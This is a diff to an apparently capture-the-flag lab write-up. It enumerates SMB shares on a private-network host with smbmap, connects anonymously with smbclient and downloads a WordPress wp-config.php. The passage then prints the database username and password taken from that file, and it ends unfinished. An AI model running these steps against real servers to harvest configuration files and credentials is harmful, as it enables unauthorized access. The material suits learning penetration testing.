@@ -86,3 +86,74 @@ Host script results:
 |   WORKGROUP<1d>        Flags: <unique><active>
 |_  WORKGROUP<1e>        Flags: <group><active>
 ```
+
+let's first go for SMB :
+
+```bash
+root@kali: smbmap -H 192.168.56.106
+
+[*] Detected 1 hosts serving SMB
+[*] Established 1 SMB session(s)
+
+[+] IP: 192.168.56.106:445      Name: 192.168.56.106            Status: Authenticated
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        print$                                                  NO ACCESS       Printer Drivers
+        share$                                                  READ ONLY       Sumshare
+        IPC$                                                    NO ACCESS       IPC Service (Web server)
+```
+
+now connect ot `share$` :
+
+```bash
+root@kali: smbclient \\192.168.56.106\share$ -N
+
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                   D        0  Tue Aug 15 07:05:52 2017
+  ..                                  D        0  Mon Aug 14 08:34:47 2017
+  wordpress                           D        0  Tue Aug 15 07:21:08 2017
+  Backnode_files                      D        0  Mon Aug 14 08:08:26 2017
+  wp                                  D        0  Tue Aug 15 06:51:23 2017
+  deets.txt                           N      139  Mon Aug 14 08:20:05 2017
+  robots.txt                          N       92  Mon Aug 14 08:36:14 2017
+  todolist.txt                        N       79  Mon Aug 14 08:39:56 2017
+  apache                              D        0  Mon Aug 14 08:35:19 2017
+  index.html                          N    36072  Sun Aug  6 01:02:15 2017
+  info.php                            N       20  Tue Aug 15 06:55:19 2017
+  test                                D        0  Mon Aug 14 08:35:10 2017
+  old                                 D        0  Mon Aug 14 08:35:13 2017
+```
+
+interesting forlder is wordpress let's see if we can find the wp-config.php file :
+
+```bash
+smb: \wordpress\> get wp-config.php
+getting file \wordpress\wp-config.php of size 3703 as wp-config.php (1808.0 KiloBytes/sec) (average 1808.1 KiloBytes/sec)
+smb: \wordpress\> exit
+```
+
+the content of `wp-config.php` file is :
+
+```text
+/** MySQL database username */
+define('DB_USER', 'Admin');
+
+/** MySQL database password */
+define('DB_PASSWORD', 'TogieMYSQL12345^^');
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
